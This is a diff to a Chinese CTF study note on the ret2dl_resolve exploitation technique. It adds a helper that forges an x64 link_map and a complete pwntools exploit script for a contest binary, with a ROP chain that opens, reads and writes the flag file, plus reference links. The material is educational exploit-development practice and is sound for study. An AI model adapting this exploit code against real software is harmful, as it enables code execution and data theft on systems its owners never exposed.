@@ -383,7 +383,7 @@ else:
 print p.read(7)             #######################  1
 p.write(p64(len(buf))+buf)  #######################  2
 
-# print "[+] read: %r" % p.read(len(buf))    ####################   3  
+# print "[+] read: %r" % p.read(len(buf)) 
 addr_link_map = p.read_p64()
 print 'addr_link_map %x' % addr_link_map
 addr_dt_debug = addr_link_map + 0x1c8
@@ -411,15 +411,143 @@ p.interact(0)
 
 - 标记1 `print p.read(7)` , 这是程序的欢迎信息, 没有用
 - 标记2`p.write(p64(len(buf))+buf) `, 官方demo写的是p32, 正确是改为p64或者把`p64(len(buf))`删除
-- 标记3, 官方demo没有把这一行注释掉,程序不能运行, 注释掉就可以成功 . (黑人问号???)
 - 标记4, 官方demo提供的这6个数字在我这不能运行, 改的小一点, 注意一致(之前相等的改完也要相等)
 
 
+_x64 64位环境 :_ 
+
+roputils在64位使用有一个限制，需要泄露出来位于GOT表前面的link_map的地址，然后写入link_map_addr + 0x1c8 = 0，用来bypass。
+
+今天(2018.4.5)看到有大佬伪造link_map来突破这个限制。
+
+[链接1](http://veritas501.space/2017/10/07/ret2dl_resolve%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/)
+[链接2](http://ddaa.tw/hitcon_pwn_200_blinkroot.html)
+
+
+辅助函数：
+
+```python
+def ret2dl_resolve_linkmap_x64(ELF_obj,known_offset_addr,two_offset,linkmap_addr):
+    '''
+    WARNING: assert *(known_offset_addr-8) & 0x0000ff0000000000 != 0 
+    WARNING: fake_linkmap is 0x100 bytes length,be careful
+    WARNING: two_offset = target - *(known_offset_addr)
+
+    _dl_runtime_resolve(linkmap,reloc_arg)
+    reloc_arg=0
+
+    linkmap:
+    0x00: START
+    0x00: l_addr = two_offset
+    0x08: fake_DT_JMPREL : 0
+    0x10: fake_DT_JMPREL : p_fake_JMPREL
+    0x18: fake_JMPREL = [p_r_offset,r_info,append],p_r_offset
+    0x20: r_info
+    0x28: append
+    0x30: r_offset
+    0x38: fake_DT_SYMTAB: 0
+    0x40: fake_DT_SYMTAB: known_offset_addr-8
+    0x48: /bin/sh(for system)
+    0x68: P_DT_STRTAB = linkmap_addr(just a pointer)
+    0x70: p_DT_SYMTAB = fake_DT_SYMTAB
+    0xf8: p_DT_JMPREL = fake_DT_JMPREL
+    0x100: END
+    '''
+    plt0 = ELF_obj.get_section_by_name('.plt').header.sh_addr
+
+    linkmap=""
+    linkmap+=p64(two_offset&(2**64-1))
+    linkmap+=p64(0)+p64(linkmap_addr+0x18)
+    linkmap+=p64((linkmap_addr+0x30-two_offset)&(2**64-1))+p64(0x7)+p64(0)
+    linkmap+=p64(0)
+    linkmap+=p64(0)+p64(known_offset_addr-8)
+    linkmap+='/bin/sh\x00'#for system offset 0x48
+    linkmap = linkmap.ljust(0x68,'A')
+    linkmap+=p64(linkmap_addr)
+    linkmap+=p64(linkmap_addr+0x38)
+    linkmap = linkmap.ljust(0xf8,'A')
+    linkmap+=p64(linkmap_addr+8)
+
+    resolve_call = p64(plt0+6)+p64(linkmap_addr)+p64(0)
+    return (linkmap,resolve_call)
+```
+
+
+[DEMO](http://veritas501.space/2018/03/28/%E4%B8%A4%E6%AC%A1CTF%E6%AF%94%E8%B5%9B%E6%80%BB%E7%BB%93/#pwn-xx-game)：
+
+```python
+#coding=utf8
+from pwn import *
+context.log_level = 'debug'
+context.terminal = ['gnome-terminal','-x','bash','-c']
+
+local = 1
+
+if local:
+    cn = process(['./dec.pwn','4091897675'],env={'LD_PRELOAD':'./libc.so'})
+    bin = ELF('./dec.pwn')
+    libc = ELF('./libc.so')
+else:
+    cn = remote('39.107.32.202',2333)
+    bin = ELF('./dec.pwn')
+    libc = ELF('./libc.so')
+
+def z(a=''):
+    gdb.attach(cn,a)
+    if a == '':
+        raw_input()
+
+luckynum = [4091897675,4091897725,4091897731]
+
+def ret2dl_resolve_linkmap_x64(ELF_obj,known_offset_addr,two_offset,linkmap_addr):
+    plt0 = ELF_obj.get_section_by_name('.plt').header.sh_addr
+    linkmap=""
+    linkmap+=p64(two_offset&(2**64-1))
+    linkmap+=p64(0)+p64(linkmap_addr+0x18)
+    linkmap+=p64((linkmap_addr+0x30-two_offset)&(2**64-1))+p64(0x7)+p64(0)
+    linkmap+=p64(0)
+    linkmap+=p64(0)+p64(known_offset_addr-8)
+    linkmap+='flag\x00'#for open offset 0x48
+    linkmap = linkmap.ljust(0x68,'A')
+    linkmap+=p64(linkmap_addr)
+    linkmap+=p64(linkmap_addr+0x38)
+    linkmap = linkmap.ljust(0xf8,'A')
+    linkmap+=p64(linkmap_addr+8)
+
+    resolve_call = p64(plt0+6)+p64(linkmap_addr)+p64(0)
+    return (linkmap,resolve_call)
+
+prdi=0x0000000000400da3
+prsi_r15=0x0000000000400da1
+buf = 0x602100
+stage = 0x602400
+prdx = 0x0000000000001b92# : pop rdx ; ret
+
+#open
+linkmap1,call1 = ret2dl_resolve_linkmap_x64(bin,bin.got['__libc_start_main'],libc.sym['open']-libc.sym['__libc_start_main'],stage)
+#read
+linkmap2,call2 = ret2dl_resolve_linkmap_x64(bin,bin.got['__libc_start_main'],libc.sym['read']-libc.sym['__libc_start_main'],stage+0x100)
+#write
+linkmap3,call3 = ret2dl_resolve_linkmap_x64(bin,bin.got['__libc_start_main'],libc.sym['write']-libc.sym['__libc_start_main'],stage+0x200)
+#set rdx
+linkmap4,call4 = ret2dl_resolve_linkmap_x64(bin,bin.got['__libc_start_main'],prdx-libc.sym['__libc_start_main'],stage+0x300)
+
+pay = 'a'*0x148+p64(prdi)+p64(stage)+p64(bin.plt['gets']) #write linkmap
+pay+=p64(prdi)+p64(stage+0x48)+p64(prsi_r15)+p64(0)+p64(0)+call1 #open
+pay+=p64(prdi)+p64(3)+p64(prsi_r15)+p64(buf)+p64(0)+call2 # read
+pay+=call4+p64(0x20) #set rdx
+pay+=p64(prdi)+p64(1)+p64(prsi_r15)+p64(buf)+p64(0)+call3 #write
+pay+=p64(0x400D36)
+#z('b*0x0000000000400CE8\nb write\nb read\nc')
+cn.sendline(pay)
+sleep(0.1)
+cn.sendline(linkmap1+linkmap2+linkmap3+linkmap4)
+
+cn.interactive()
+```
 
 
 ## 参考
-
-
 
 [http://rk700.github.io/2015/08/09/return-to-dl-resolve/](http://rk700.github.io/2015/08/09/return-to-dl-resolve/)
 
@@ -428,3 +556,5 @@ p.interact(0)
 [http://fanrong1992.github.io/2016/11/09/Return-to-dl-resolve/](http://fanrong1992.github.io/2016/11/09/Return-to-dl-resolve/)
 
 [http://blog.csdn.net/guiguzi5512407/article/details/52752914](http://blog.csdn.net/guiguzi5512407/article/details/52752914)
+
+[http://phrack.org/issues/58/4.html#article](http://phrack.org/issues/58/4.html#article)
